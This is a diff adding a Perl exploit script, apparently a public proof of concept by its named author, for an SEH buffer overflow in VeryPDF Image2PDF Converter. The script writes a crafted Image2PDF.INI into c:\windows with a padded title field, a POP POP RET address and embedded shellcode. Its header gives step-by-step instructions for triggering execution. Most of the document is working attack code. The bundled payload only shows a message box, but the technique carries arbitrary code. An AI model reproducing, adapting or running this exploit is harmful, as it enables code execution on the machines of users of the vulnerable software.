@@ -1,0 +1,60 @@
+#********************************************************************************************************************************************
+# 
+# Exploit Title: VeryPDF Image2PDF Converter SEH Buffer Overflow
+# Date: 10-7-2015
+# Software Link: http://www.verypdf.com/tif2pdf/img2pdf.exe
+# Exploit Author: Robbie Corley
+# Platform Tested: Windows 7 x64
+# Contact: c0d3rc0rl3y@gmail.com
+# Website: 
+# CVE: 
+# Category: Local Exploit
+#
+# Description:
+# The title parameter contained within the c:\windows\Image2PDF.INI is vulnerable to a buffer overflow.  
+# This can be exploited using SEH overwrite.
+# 
+# Instructions:  
+# 1. Run this sploit as-is.  This will generate the new .ini file and place it in c:\windows, overwriting the existing file
+# 2. Run the Image2PDF program, hit [try], file --> add files
+# 3. Open any .tif file.  Here's the location of one that comes with the installation: C:\Program Files (x86)\VeryPDF Image2PDF v3.2\trial.tif
+# 4. Hit 'Make PDF', type in anything for the name of the pdf-to-be, and be greeted with your executed shellcode ;)
+#**********************************************************************************************************************************************
+
+#standard messagebox shellcode.  
+$shellcode =
+"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42".
+"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03".
+"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b".
+"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e".
+"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c".
+"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74".
+"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe".
+"\x49\x0b\x31\xc0\x51\x50\xff\xd7";
+
+$padding="\x90" x 2985;
+$seh=pack('V',0x6E4B3045); #STANDARD POP POP RET
+$morepadding="\x90" x 1096;
+
+open(myfile,'>c:\\windows\\Image2PDF.INI'); #generate the dummy DWF file
+
+#.ini file header & shellcode
+print myfile "[SaveMode]
+m_iMakePDFMode=0
+m_iSaveMode=0
+m_szFilenameORPath=
+m_iDestinationMode=0
+m_bAscFilename=0
+m_strFileNumber=0001
+[BaseSettingDlg]
+m_bCheckDespeckle=0
+m_bCheckSkewCorrect=0
+m_bCheckView=0
+m_szDPI=default
+m_bCheckBWImage=1
+[SetPDFInfo]
+m_szAuthor=
+m_szSubject=
+m_szTitle=".$padding."\xEB\x06\x90\x90".$seh.$shellcode.$morepadding; 
+
+close (myfile); #close the file
